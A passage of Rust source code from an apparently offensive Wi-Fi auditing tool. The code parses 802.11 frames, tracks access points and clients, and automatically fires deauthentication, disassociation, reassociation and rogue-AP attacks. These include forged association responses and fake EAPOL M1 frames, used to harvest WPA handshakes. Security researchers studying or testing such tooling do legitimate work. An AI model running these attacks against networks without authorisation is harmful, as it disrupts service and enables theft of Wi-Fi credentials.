                        .map(|nssid| nssid.replace('\0', ""));

                    if bssid.is_real_device() && bssid != oxide.target_data.rogue_client {
                        let ap: &mut AccessPoint = oxide.access_points.add_or_update_device(
                            bssid,
                            &AccessPoint::from_beacon(&beacon_frame, &radiotap, &oxide)?,
                        );

                        // Proliferate whitelist
                        let _ = oxide.target_data.whitelist.get_whitelisted(ap);

                        // Proliferate the SSID / MAC to targets (if this is a target)
                        // Also handle adding the target channel to autohunt params.

                        let targets = oxide.target_data.targets.get_targets(ap);
                        if !targets.is_empty() {
                            // This is a target_data target
                            if let Some(channel) = station_info.ds_parameter_set {
                                // We have a channel in the broadcast (real channel)
                                if oxide
                                    .if_hardware
                                    .hop_channels
                                    .contains(&(band.to_u8(), channel.into()))
                                {
                                    // We are autohunting and our current channel is real (band/channel match)
                                    for target in targets {
                                        // Go through all the target matches we got (which could be a Glob SSID, Match SSID, and MAC!)
                                        if let Some(vec) =
                                            oxide.if_hardware.target_chans.get_mut(&target)
                                        {
                                            // This target is inside hop_chans
                                            // Update the target with this band/channel (if it isn't already there)
                                            if !vec.contains(&(band.to_u8(), channel.into())) {
                                                vec.push((band.to_u8(), channel.into()));
                                            }
                                        } else {
                                            // Add this target to target_chans (this was a "proliferated" target we didn't know about at first)
                                            oxide.if_hardware.target_chans.insert(
                                                target,
                                                vec![(band.to_u8(), channel.into())],
                                            );
                                        }
                                    }
                                }
                            }
                        };

                        // No SSID, send a probe request. This is low-key so don't increment interactions for this AP.
                        if !ap.ssid.clone().is_some_and(|ssid| !ssid.is_empty())
                            && !oxide.config.notx
                            && ap.beacon_count % 200 == 0
                        {
                            let frx = build_probe_request_target(
                                &oxide.target_data.rogue_client,
                                &bssid,
                                oxide.counters.sequence2(),
                            );
                            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
                            oxide.status_log.add_message(StatusMessage::new(
                                MessageType::Info,
                                format!("Attempting Hidden SSID Collect: {}", bssid),
                            ));
                        }
                        beacon_count = ap.beacon_count;
                    }

                    // Always try M1 Retrieval
                    // it is running it's own internal rate limiting.
                    let _ = m1_retrieval_attack(oxide, &bssid);

                    let rate = beacon_count % oxide.target_data.attack_rate.to_rate();

                    if (rate) == 0 {
                        deauth_attack(oxide, &bssid)?;
                    } else if (rate) == oxide.target_data.attack_rate.to_rate() / 4 {
                        anon_reassociation_attack(oxide, &bssid)?;
                    } else if (rate) == (oxide.target_data.attack_rate.to_rate() / 4) * 2 {
                        //csa_attack(oxide, beacon_frame)?;
                    } else if (rate) == (oxide.target_data.attack_rate.to_rate() / 4) * 3 {
                        disassoc_attack(oxide, &bssid)?;
                    }

                    // Increase beacon count (now that the attacks are over)
                    if let Some(ap) = oxide.access_points.get_device(&bssid) {
                        ap.beacon_count += 1;
                    }
                }
                Frame::ProbeRequest(probe_request_frame) => {
                    oxide.counters.probe_requests += 1;

                    let client_mac = probe_request_frame.header.address_2; // MAC address of the client
                    let ap_mac = probe_request_frame.header.address_1; // MAC address of the client
                    let signal_strength = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );
                    let ssid = &probe_request_frame.station_info.ssid;

                    if client_mac.is_real_device() && client_mac != oxide.target_data.rogue_client {
                        if !ap_mac.is_broadcast() {
                            // Directed probe request
                            match ssid {
                                Some(ssid) => {
                                    // Add to unassoc clients.
                                    oxide.unassoc_clients.add_or_update_device(
                                        client_mac,
                                        &Station::new_unassoc_station(
                                            client_mac,
                                            signal_strength,
                                            vec![ssid.to_string()],
                                            oxide.file_data.oui_database.search(&client_mac),
                                        ),
                                    );
                                }
                                None => {}
                            }
                            // Probe request attack - Begin our RogueM2 attack procedure.
                            rogue_m2_attack_directed(oxide, probe_request_frame)?;
                        } else {
                            // undirected probe request

                            match ssid {
                                None => {
                                    // Add to unassoc clients.
                                    oxide.unassoc_clients.add_or_update_device(
                                        client_mac,
                                        &Station::new_unassoc_station(
                                            client_mac,
                                            signal_strength,
                                            vec![],
                                            oxide.file_data.oui_database.search(&client_mac),
                                        ),
                                    );
                                }
                                Some(ssid) => {
                                    // Add to unassoc clients.
                                    oxide.unassoc_clients.add_or_update_device(
                                        client_mac,
                                        &Station::new_unassoc_station(
                                            client_mac,
                                            signal_strength,
                                            vec![ssid.to_string()],
                                            oxide.file_data.oui_database.search(&client_mac),
                                        ),
                                    );
                                }
                            }

                            // Probe request attack - Begin our RogueM2 attack procedure.
                            rogue_m2_attack_undirected(oxide, probe_request_frame)?;
                        }
                    }
                }
                Frame::ProbeResponse(probe_response_frame) => {
                    // Assumption:
                    //  Only an AP will send a probe response.
                    //
                    oxide.counters.probe_responses += 1;
                    let bssid = &probe_response_frame.header.address_3;
                    let signal_strength = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );
                    if bssid.is_real_device() && *bssid != oxide.target_data.rogue_client {
                        let station_info = &probe_response_frame.station_info;
                        let ssid = station_info
                            .ssid
                            .as_ref()
                            .map(|nssid| nssid.replace('\0', ""));
                        let ap = oxide.access_points.add_or_update_device(
                            *bssid,
                            &AccessPoint::from_probe_response(
                                &probe_response_frame,
                                &radiotap,
                                &oxide,
                            )?,
                        );

                        ap.pr_station = Some(probe_response_frame.station_info.clone());

                        // Proliferate whitelist
                        let _ = oxide.target_data.whitelist.get_whitelisted(ap);

                        // Proliferate the SSID / MAC to targets (if this is a target)
                        // Also handle adding the target channel to autohunt params.

                        let targets = oxide.target_data.targets.get_targets(ap);
                        if !targets.is_empty() {
                            // This is a target_data target
                            if let Some(channel) = station_info.ds_parameter_set {
                                // We have a channel in the broadcast (real channel)
                                if oxide
                                    .if_hardware
                                    .hop_channels
                                    .contains(&(band.to_u8(), channel.into()))
                                {
                                    // We are autohunting and our current channel is real (band/channel match)
                                    for target in targets {
                                        // Go through all the target matches we got (which could be a Glob SSID, Match SSID, and MAC!)
                                        if let Some(vec) =
                                            oxide.if_hardware.target_chans.get_mut(&target)
                                        {
                                            // This target is inside hop_chans
                                            // Update the target with this band/channel (if it isn't already there)
                                            if !vec.contains(&(band.to_u8(), channel.into())) {
                                                vec.push((band.to_u8(), channel.into()));
                                            }
                                        } else {
                                            // Add this target to target_chans (this was a "proliferated" target we didn't know about at first)
                                            oxide.if_hardware.target_chans.insert(
                                                target,
                                                vec![(band.to_u8(), channel.into())],
                                            );
                                        }
                                    }
                                }
                            }
                        };
                        let _ = m1_retrieval_attack(oxide, bssid);
                    };
                }
                Frame::Authentication(auth_frame) => {
                    oxide.counters.authentication += 1;

                    // Assumption:
                    //  Authentication packets can be sent by the AP or Client.
                    //  We will use the sequence number to decipher.

                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if auth_frame.auth_algorithm == 0 {
                        // Open system (Which can be open or WPA2)
                        if auth_frame.auth_seq == 1 {
                            // From Client
                            let client = auth_frame.header.address_2;
                            let ap_addr = auth_frame.header.address_1;

                            // First let's add it to our unassociated clients list:
                            let station = oxide.unassoc_clients.add_or_update_device(
                                client,
                                &Station::new_unassoc_station(
                                    client,
                                    signal,
                                    vec![],
                                    oxide.file_data.oui_database.search(&client),
                                ),
                            );

                            if ap_addr == oxide.target_data.rogue_client {
                                // We need to send an auth back
                                let frx = build_authentication_response(
                                    &client,
                                    &ap_addr,
                                    &ap_addr,
                                    oxide.counters.sequence3(),
                                );
                                write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx)?;
                                station.interactions += 1;
                            }
                        } else if auth_frame.auth_seq == 2 {
                            //// From AP
                            let client = auth_frame.header.address_1;
                            let ap_addr = auth_frame.header.address_2;

                            // Add AP
                            oxide.access_points.add_or_update_device(
                                ap_addr,
                                &AccessPoint::new(
                                    ap_addr,
                                    signal,
                                    None,
                                    None,
                                    None,
                                    oxide.target_data.rogue_client,
                                    None,
                                    oxide.file_data.oui_database.search(&ap_addr),
                                ),
                            );

                            if client != oxide.target_data.rogue_client {
                                // If it's not our rogue client that it's responding to.
                                oxide.unassoc_clients.add_or_update_device(
                                    client,
                                    &Station::new_unassoc_station(
                                        client,
                                        AntennaSignal::from_bytes(&[0u8])
                                            .map_err(|err| err.to_string())?,
                                        vec![],
                                        oxide.file_data.oui_database.search(&client),
                                    ),
                                );
                            } else {
                                let _ = m1_retrieval_attack_phase_2(
                                    &ap_addr,
                                    &oxide.target_data.rogue_client.clone(),
                                    oxide,
                                );
                            }
                        }
                    }
                }
                Frame::Deauthentication(deauth_frame) => {
                    oxide.counters.deauthentication += 1;

                    // Assumption:
                    //  Deauthentication packets can be sent by the AP or Client.
                    //
                    let from_ds: bool = deauth_frame.header.frame_control.from_ds();
                    let to_ds: bool = deauth_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        deauth_frame.header.address_2
                    } else if !from_ds && to_ds {
                        deauth_frame.header.address_1
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        deauth_frame.header.address_2
                    } else {
                        deauth_frame.header.address_1
                    };

                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    // Add AP
                    if ap_addr.is_real_device() {
                        oxide.access_points.add_or_update_device(
                            ap_addr,
                            &AccessPoint::new(
                                ap_addr,
                                if from_ds {
                                    signal
                                } else {
                                    AntennaSignal::from_bytes(&[0u8])
                                        .map_err(|err| err.to_string())?
                                },
                                None,
                                None,
                                None,
                                oxide.target_data.rogue_client,
                                None,
                                oxide.file_data.oui_database.search(&ap_addr),
                            ),
                        );
                    }

                    // If client sends deauth... we should probably treat as unassoc?
                    if station_addr.is_real_device()
                        && station_addr != oxide.target_data.rogue_client
                    {
                        oxide.unassoc_clients.add_or_update_device(
                            station_addr,
                            &Station::new_unassoc_station(
                                station_addr,
                                if to_ds {
                                    signal
                                } else {
                                    AntennaSignal::from_bytes(&[0u8])
                                        .map_err(|err| err.to_string())?
                                },
                                vec![],
                                oxide.file_data.oui_database.search(&station_addr),
                            ),
                        );
                    }
                }
                Frame::Action(frame) => {
                    let from_ds: bool = frame.header.frame_control.from_ds();
                    let to_ds: bool = frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        frame.header.address_2
                    } else if !from_ds && to_ds {
                        frame.header.address_1
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        frame.header.address_2
                    } else {
                        frame.header.address_1
                    };

                    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if station_addr.is_real_device()
                        && station_addr != oxide.target_data.rogue_client
                    {
                        // Make sure this isn't a broadcast or rogue

                        let client = &Station::new_station(
                            station_addr,
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                            },
                            Some(ap_addr),
                            oxide.file_data.oui_database.search(&station_addr),
                        );
                        clients.add_or_update_device(station_addr, client);
                        oxide.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = AccessPoint::new_with_clients(
                        ap_addr,
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                        },
                        None,
                        None,
                        None,
                        clients,
                        oxide.target_data.rogue_client,
                        None,
                        oxide.file_data.oui_database.search(&ap_addr),
                    );
                    oxide.access_points.add_or_update_device(ap_addr, &ap);
                }
                Frame::AssociationRequest(assoc_request_frame) => {
                    oxide.counters.association += 1;

                    // Assumption:
                    //  Only a client/potential client will ever submit an association request.
                    //  This is how we will know to send a fake M1 and try to get an M2 from it.

                    let client_mac = assoc_request_frame.header.address_2; // MAC address of the client
                    let ap_mac = assoc_request_frame.header.address_1; // MAC address of the AP.
                    let ssid = assoc_request_frame.station_info.ssid;

                    // Handle client as not yet associated
                    if client_mac.is_real_device() && client_mac != oxide.target_data.rogue_client {
                        let station = oxide.unassoc_clients.add_or_update_device(
                            client_mac,
                            &Station::new_unassoc_station(
                                client_mac,
                                radiotap.antenna_signal.unwrap_or(
                                    AntennaSignal::from_bytes(&[0u8])
                                        .map_err(|err| err.to_string())?,
                                ),
                                vec![],
                                oxide.file_data.oui_database.search(&client_mac),
                            ),
                        );

                        if ap_mac == oxide.target_data.rogue_client {
                            let rogue_ssid = ssid.unwrap_or("".to_string());
                            // We need to send an association response back
                            let frx = build_association_response(
                                &client_mac,
                                &ap_mac,
                                &ap_mac,
                                oxide.counters.sequence3(),
                                &rogue_ssid,
                            );
                            write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx)?;
                            // Then an M1
                            let m1: Vec<u8> = build_eapol_m1(
                                &client_mac,
                                &ap_mac,
                                &ap_mac,
                                oxide.counters.sequence3(),
                                &oxide.target_data.rogue_m1,
                            );
                            oxide
                                .target_data
                                .rogue_essids
                                .insert(client_mac, rogue_ssid);
                            write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &m1)?;
                            station.interactions += 2;
                        }
                    };
                    // Add AP
                    if ap_mac.is_real_device() {
                        let ap = AccessPoint::new(
                            ap_mac,
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            None,
                            None,
                            None,
                            oxide.target_data.rogue_client,
                            None,
                            oxide.file_data.oui_database.search(&ap_mac),
                        );
                        oxide.access_points.add_or_update_device(ap_mac, &ap);
                    };
                }
                Frame::AssociationResponse(assoc_response_frame) => {
                    oxide.counters.association += 1;

                    // Assumption:
                    //  Only a AP will ever submit an association response.
                    //
                    let client_mac = assoc_response_frame.header.address_1; // MAC address of the client
                    let bssid = assoc_response_frame.header.address_2; // MAC address of the AP (BSSID)

                    if bssid.is_real_device()
                        && client_mac.is_real_device()
                        && client_mac != oxide.target_data.rogue_client
                    {
                        // Valid devices
                        let mut clients = WiFiDeviceList::<Station>::new();

                        if assoc_response_frame.status_code != 0 {
                            // Association was successful
                            let client = &Station::new_station(
                                client_mac,
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                                Some(bssid),
                                oxide.file_data.oui_database.search(&client_mac),
                            );
                            clients.add_or_update_device(client_mac, client);
                            oxide.unassoc_clients.remove_device(&client_mac);
                        }
                        let station_info = &assoc_response_frame.station_info;
                        let ap = AccessPoint::new_with_clients(
                            bssid,
                            radiotap.antenna_signal.unwrap_or(
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ),
                            None,
                            None,
                            Some(APFlags {
                                apie_essid: station_info.ssid.as_ref().map(|_| true),
                                gs_ccmp: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.group_cipher_suite == RsnCipherSuite::CCMP),
                                gs_tkip: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.group_cipher_suite == RsnCipherSuite::TKIP),
                                cs_ccmp: station_info.rsn_information.as_ref().map(|rsn| {
                                    rsn.pairwise_cipher_suites.contains(&RsnCipherSuite::CCMP)
                                }),
                                cs_tkip: station_info.rsn_information.as_ref().map(|rsn| {
                                    rsn.pairwise_cipher_suites.contains(&RsnCipherSuite::TKIP)
                                }),
                                rsn_akm_psk: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK)),
                                rsn_akm_psk256: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK256)),
                                rsn_akm_pskft: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSKFT)),
                                rsn_akm_sae: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::SAE)),
                                wpa_akm_psk: station_info
                                    .wpa_info
                                    .as_ref()
                                    .map(|wpa| wpa.akm_suites.contains(&WpaAkmSuite::Psk)),
                                ap_mfp: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.mfp_required),
                            }),
                            clients,
                            oxide.target_data.rogue_client,
                            station_info.wps_info.clone(),
                            oxide.file_data.oui_database.search(&bssid),
                        );
                        oxide.access_points.add_or_update_device(bssid, &ap);
                    };
                }
                Frame::ReassociationRequest(frame) => {
                    oxide.counters.reassociation += 1;

                    // Assumption:
                    //  Only a client will ever submit an reassociation request.
                    //  Attack includes sending a reassociation response and M1 frame- looks very similar to attacking an associataion request.
                    let client_mac = frame.header.address_2; // MAC address of the client
                    let new_ap = frame.header.address_1; // MAC address of the AP
                    let old_ap = frame.current_ap_address;
                    let ssid = frame.station_info.ssid;

                    // Technically the client is still associated to the old AP. Let's add it there and we will handle moving it over if we get a reassociation response.
                    if old_ap.is_real_device()
                        && client_mac.is_real_device()
                        && client_mac != oxide.target_data.rogue_client
                    {
                        // Valid devices
                        let mut clients = WiFiDeviceList::<Station>::new();

                        // Setup client
                        let client = &Station::new_station(
                            client_mac,
                            radiotap.antenna_signal.unwrap_or(
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ),
                            Some(old_ap),
                            oxide.file_data.oui_database.search(&client_mac),
                        );
                        clients.add_or_update_device(client_mac, client);
                        oxide.unassoc_clients.remove_device(&client_mac);

                        let ap = AccessPoint::new_with_clients(
                            old_ap,
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ssid.clone(),
                            None,
                            None,
                            clients,
                            oxide.target_data.rogue_client,
                            None,
                            oxide.file_data.oui_database.search(&old_ap),
                        );
                        oxide.access_points.add_or_update_device(old_ap, &ap);

                        let newap = AccessPoint::new_with_clients(
                            new_ap,
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ssid.clone(),
                            None,
                            None,
                            WiFiDeviceList::<Station>::new(),
                            oxide.target_data.rogue_client,
                            None,
                            oxide.file_data.oui_database.search(&new_ap),
                        );
                        oxide.access_points.add_or_update_device(new_ap, &newap);
                    };
                }
                Frame::ReassociationResponse(frame) => {
                    oxide.counters.reassociation += 1;
                    // Assumption:
                    //  Only a AP will ever submit a reassociation response.
                    //
                    let client_mac = frame.header.address_1; // MAC address of the client
                    let ap_mac = frame.header.address_2; // MAC address of the AP (BSSID)

                    if ap_mac.is_real_device()
                        && client_mac.is_real_device()
                        && client_mac != oxide.target_data.rogue_client
                    {
                        // Valid devices
                        let mut clients = WiFiDeviceList::<Station>::new();

                        if frame.status_code != 0 {
                            // Association was successful
                            let client = &Station::new_station(
                                client_mac,
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                                Some(ap_mac),
                                oxide.file_data.oui_database.search(&client_mac),
                            );
                            clients.add_or_update_device(client_mac, client);
                            oxide.unassoc_clients.remove_device(&client_mac);
                            // Find the old AP, remove this device from it.
                            if let Some(old_ap) =
                                oxide.access_points.find_ap_by_client_mac(&client_mac)
                            {
                                old_ap.client_list.remove_device(&client_mac);
                            }
                        }
                        let ap = AccessPoint::new_with_clients(
                            ap_mac,
                            radiotap.antenna_signal.unwrap_or(
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ),
                            None,
                            None,
                            None,
                            clients,
                            oxide.target_data.rogue_client,
                            None,
                            oxide.file_data.oui_database.search(&ap_mac),
                        );
                        oxide.access_points.add_or_update_device(ap_mac, &ap);
                    };
                }
                Frame::Rts(frame) => {
                    oxide.counters.control_frames += 1;
                    // Most drivers (Mediatek, Ralink, Atheros) don't seem to be actually sending these to userspace (on linux).
                    let source_mac = frame.source; // MAC address of the source
                    let dest_mac = frame.destination; // MAC address of the destination
                    let from_ds: bool = frame.frame_control.from_ds();
                    let to_ds: bool = frame.frame_control.to_ds();

                    // Figure out our AP and Client using from_ds / to_ds
                    let ap_addr = if from_ds && !to_ds {
                        source_mac
                    } else if !from_ds && to_ds {
                        dest_mac
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };
                    let station_addr = if !from_ds && to_ds {
                        source_mac
                    } else {
                        dest_mac
                    };

                    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if station_addr.is_real_device()
                        && station_addr != oxide.target_data.rogue_client
                    {
                        // Make sure this isn't a broadcast or something

                        let client = &Station::new_station(
                            station_addr,
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                            },
                            Some(ap_addr),
                            oxide.file_data.oui_database.search(&station_addr),
                        );
                        clients.add_or_update_device(station_addr, client);
                        oxide.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = AccessPoint::new_with_clients(
                        ap_addr,
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                        },
                        None,
                        None,
                        None,
                        clients,
                        oxide.target_data.rogue_client,
                        None,
                        oxide.file_data.oui_database.search(&ap_addr),
                    );
                    oxide.access_points.add_or_update_device(ap_addr, &ap);
                }
                Frame::Cts(_) => {
                    oxide.counters.control_frames += 1;
                    // Not really doing anything with these yet...
                }
                Frame::Ack(_) => {
                    oxide.counters.control_frames += 1;
                    // Not really doing anything with these yet...
                }
                Frame::BlockAck(frame) => {
                    oxide.counters.control_frames += 1;
                    //println!("BlockAck: {} => {}", frame.source, frame.destination);
                    let source_mac = frame.source; // MAC address of the source
                    let dest_mac = frame.destination; // MAC address of the destination
                    let from_ds: bool = frame.frame_control.from_ds();
                    let to_ds: bool = frame.frame_control.to_ds();

                    // Figure out our AP and Client using from_ds / to_ds
                    let ap_addr = if from_ds && !to_ds {
                        source_mac
                    } else if !from_ds && to_ds {
                        dest_mac
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };
                    let station_addr = if !from_ds && to_ds {
                        source_mac
                    } else {
                        dest_mac
                    };

                    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if station_addr.is_real_device()
                        && station_addr != oxide.target_data.rogue_client
                    {
                        // Make sure this isn't a broadcast or something

                        let client = &Station::new_station(
                            station_addr,
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                            },
                            Some(ap_addr),
                            oxide.file_data.oui_database.search(&station_addr),
                        );
                        clients.add_or_update_device(station_addr, client);
                        oxide.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = AccessPoint::new_with_clients(
                        ap_addr,
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                        },
                        None,
                        None,
                        None,
                        clients,
                        oxide.target_data.rogue_client,
                        None,
                        oxide.file_data.oui_database.search(&ap_addr),
                    );
                    oxide.access_points.add_or_update_device(ap_addr, &ap);
                }
                Frame::BlockAckRequest(frame) => {
                    oxide.counters.control_frames += 1;
                    let source_mac = frame.source; // MAC address of the source
                    let dest_mac = frame.destination; // MAC address of the destination
                    let from_ds: bool = frame.frame_control.from_ds();
                    let to_ds: bool = frame.frame_control.to_ds();

                    // Figure out our AP and Client using from_ds / to_ds
                    let ap_addr = if from_ds && !to_ds {
                        source_mac
                    } else if !from_ds && to_ds {
                        dest_mac
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };
                    let station_addr = if !from_ds && to_ds {
                        source_mac
                    } else {
                        dest_mac
                    };

                    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if station_addr.is_real_device()
                        && station_addr != oxide.target_data.rogue_client
                    {
                        // Make sure this isn't a broadcast or something

                        let client = &Station::new_station(
                            station_addr,
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                            },
                            Some(ap_addr),
                            oxide.file_data.oui_database.search(&station_addr),
                        );
                        clients.add_or_update_device(station_addr, client);
                        oxide.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = AccessPoint::new_with_clients(
                        ap_addr,
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                        },
                        None,
                        None,
                        None,
                        clients,
                        oxide.target_data.rogue_client,
                        None,
                        oxide.file_data.oui_database.search(&ap_addr),
                    );
                    oxide.access_points.add_or_update_device(ap_addr, &ap);
                }
                Frame::Data(data_frame) => handle_data_frame(&data_frame, &radiotap, oxide)?,
                Frame::NullData(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide)?
                }
                Frame::QosNull(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide)?
                }
                Frame::QosData(data_frame) => handle_data_frame(&data_frame, &radiotap, oxide)?,
                Frame::DataCfAck(data_frame) => handle_data_frame(&data_frame, &radiotap, oxide)?,
                Frame::DataCfPoll(data_frame) => handle_data_frame(&data_frame, &radiotap, oxide)?,
                Frame::DataCfAckCfPoll(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide)?
                }
                Frame::CfAck(data_frame) => handle_null_data_frame(&data_frame, &radiotap, oxide)?,
                Frame::CfPoll(data_frame) => handle_null_data_frame(&data_frame, &radiotap, oxide)?,
                Frame::CfAckCfPoll(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide)?
                }
                Frame::QosDataCfAck(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide)?
                }
                Frame::QosDataCfPoll(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide)?
                }
                Frame::QosDataCfAckCfPoll(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide)?
                }
                Frame::QosCfPoll(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide)?
                }
                Frame::QosCfAckCfPoll(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide)?
                }
            }
            // Post Processing
        }
        Err(err) => {
            match err {
                libwifi::error::Error::Failure(message, _data) => match &message[..] {
                    "An error occured while parsing the data: nom::ErrorKind is Eof" => {}
                    _ => {
                        oxide.status_log.add_message(StatusMessage::new(
                            MessageType::Error,
                            format!("Libwifi Parsing Error: {message:?}",),
                        ));
                        oxide.counters.error_count += 1;
                    }
                },
                libwifi::error::Error::Incomplete(_) => {}
                libwifi::error::Error::UnhandledFrameSubtype(_, _) => {}
                libwifi::error::Error::UnhandledProtocol(_) => {}
            }
            return Err("Parsing Error".to_owned());
        }
    };

    // Build FrameData package for sending to Database/PCAP-NG
    let pcapgps = if gps_data.has_fix() {
        Some(gps_data)
    } else {
        None
    };

    let freq = Some(current_freq.frequency.unwrap() as f64);
    let signal = radiotap.antenna_signal.map(|signal| signal.value as i32);
    let rate = radiotap.rate.map(|rate| rate.value as f64);

    let frxdata = FrameData::new(
        SystemTime::now(),
        packet_id,
        packet.to_vec(),
        pcapgps,
        source,
        destination,
        freq,
        signal,
        rate,
        oxide.if_hardware.interface_uuid,
    );

    // Send to pcap
    oxide.file_data.current_pcap.send(frxdata.clone());
    // Send to database
    oxide.file_data.db_writer.send(frxdata.clone());

    Ok(())
}

fn handle_data_frame(
    data_frame: &impl DataFrame,
    rthdr: &Radiotap,
    oxide: &mut OxideRuntime,
) -> Result<(), String> {
    oxide.counters.data += 1;

    let source = data_frame.header().src().expect("Unable to get src");
    let dest = data_frame.header().dest();
    let from_ds: bool = data_frame.header().frame_control.from_ds();
    let to_ds: bool = data_frame.header().frame_control.to_ds();
    let ap_addr = if from_ds && !to_ds {
        data_frame.header().address_2
    } else if !from_ds && to_ds {
        data_frame.header().address_1
    } else {
        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
        // lets just ignore it lol
        return Ok(());
    };

    let station_addr = if !from_ds && to_ds {
        data_frame.header().address_2
    } else {
        data_frame.header().address_1
    };

    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
    let signal = rthdr
        .antenna_signal
        .unwrap_or(AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?);

    if ap_addr != oxide.target_data.rogue_client {
        if station_addr.is_real_device() && station_addr != oxide.target_data.rogue_client {
            // Make sure this isn't a broadcast or something
            let client = &Station::new_station(
                station_addr,
                if to_ds {
                    signal
                } else {
                    AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                },
                Some(ap_addr),
                oxide.file_data.oui_database.search(&station_addr),
            );
            clients.add_or_update_device(station_addr, client);
            oxide.unassoc_clients.remove_device(&station_addr);
        }

        // Create and Add/Update AccessPoint
        let ap = AccessPoint::new_with_clients(
            ap_addr,
            if from_ds {
                signal
            } else {
                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
            },
            None,
            None,
            None,
            clients,
            oxide.target_data.rogue_client,
            None,
            oxide.file_data.oui_database.search(&ap_addr),
        );
        oxide.access_points.add_or_update_device(ap_addr, &ap);
    }

    // Handle frames that contain EAPOL.
